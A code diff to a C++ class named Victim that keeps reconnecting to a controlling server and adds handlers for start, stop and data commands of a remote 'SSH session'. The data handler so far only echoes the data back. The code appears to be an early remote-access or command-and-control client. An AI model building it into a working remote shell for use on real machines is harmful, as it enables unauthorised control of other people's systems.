@@ -17,13 +17,42 @@ int Victim::runVictimProcess()
 		auto status = server.receive(p);
 
 		if (status == sf::Socket::Status::Disconnected) {
+			isSshActive = false;
 			while (!connectServer())
 				sf::sleep(sf::seconds(2));
 		}
 		if (status != sf::Socket::Status::Done)
 			continue;
 
+		uint16_t reqId = 0;
+		uint8_t cmd;
+		p >> reqId >> cmd;
 
+		//start ssh session
+		if (cmd == uint8_t(9)) {
+			isSshActive = true;
+			std::cout << "SSH session started\n";
+
+			sf::Packet res;
+			res << reqId << uint8_t(11) << std::string("SSH STARTED");
+			auto _ = server.send(res);
+		}
+		//end ssh session
+		else if (cmd == uint8_t(10)) {
+			isSshActive = false;
+			std::cout << "SSH session stopped\n";
+		}
+		//receive ssh data
+		else if (cmd == uint8_t(11)) {
+			std::string data;
+			p >> data;
+			data = "#" + data + "#";
+			std::cout << "SSH data received: " << data << "\n";
+
+			sf::Packet res;
+			res << reqId << uint8_t(11) << data;
+			auto _ = server.send(res);
+		}
 	}
 
 	return 0;
@@ -68,8 +97,6 @@ bool Victim::connectServer()
 		if (!waiting)
 			break;
 	}
-
-	std::cout << "waiting: " << waiting << "\n";
 
 	if (waiting) {
 		waiting = false;
